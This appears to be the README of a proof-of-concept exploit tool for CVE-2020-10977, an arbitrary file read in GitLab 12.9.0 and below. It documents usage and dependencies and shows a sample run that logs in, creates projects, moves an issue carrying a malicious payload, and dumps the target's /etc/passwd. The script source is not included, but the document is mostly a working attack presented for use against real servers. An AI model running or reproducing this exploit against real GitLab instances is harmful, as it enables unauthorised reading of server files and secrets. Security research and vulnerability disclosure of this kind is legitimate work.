# CVE-2020-10977

## GitLab 12.9.0 Arbitrary File Read

**Target :** 12.9.0 and below

**Tested :** GitLab 12.8.1

In a recent engagement I found a GitLab instance on the target, I found a PoC on Exploit-DB but it uses LDAP for authentication and it was disabled in this case, so I created this python script which can authenticate using web GUI, like the original PoC it will create two projects, an issue in one of the projects with the malicious payload and it will move this issue from one project to another and will automatically read the file contents.

I have added few things such as the script will ask for an absolute path you wish to read, after printing its contents it will ask for another path and cleanup on exit, both projects will be automatically deleted when you exit the script using `CTRL+C`

```
$ python3 cve_2020_10977.py http://localhost twh p4ssw0rd
----------------------------------
--- CVE-2020-10977 ---------------
--- GitLab Arbitrary File Read ---
--- 12.9.0 & Below ---------------
----------------------------------

[>] Found By : vakzz       [ https://hackerone.com/reports/827052 ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t      ]

[+] Target        : http://localhost
[+] Username      : twh
[+] Password      : p4ssw0rd
[+] Project Names : ProjectOne, ProjectTwo

[!] Trying to Login...
[+] Login Successful!
[!] Creating ProjectOne...
[+] ProjectOne Created Successfully!
[!] Creating ProjectTwo...
[+] ProjectTwo Created Successfully!
[>] Absolute Path to File : /etc/passwd
[!] Creating an Issue...
[+] Issue Created Successfully!
[!] Moving Issue...
[+] Issue Moved Successfully!
[+] File URL : http://localhost/twh/ProjectTwo/uploads/5f74b01d2b58e4a57ca55e1ac8778650/passwd

> /etc/passwd
----------------------------------------

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
.
.
.
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
.
.
.
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

----------------------------------------

[>] Absolute Path to File : ^C
[-] Keyboard Interrupt
[!] Deleting ProjectOne...
[+] ProjectOne Successfully Deleted!
[!] Deleting ProjectTwo...
[+] ProjectTwo Successfully Deleted!
```

## Dependencies

```
pip3 install requests bs4
```


## Usage

Register an account on target GitLab and use the same credentials with the script

```
$ python3 cve_2020_10977.py -h
usage: cve_2020_10977.py [-h] url username password

positional arguments:
  url         Target URL with http(s)://
  username    GitLab Username
  password    GitLab Password

optional arguments:
  -h, --help  show this help message and exit
```

## Credits

* Thank you `vakzz` for finding this bug in GitLab
	* HackerOne Report : https://hackerone.com/reports/827052
* Thank you `KouroshRZ` for creating a PoC for this exploit
	* Exploit-DB : https://www.exploit-db.com/exploits/48431
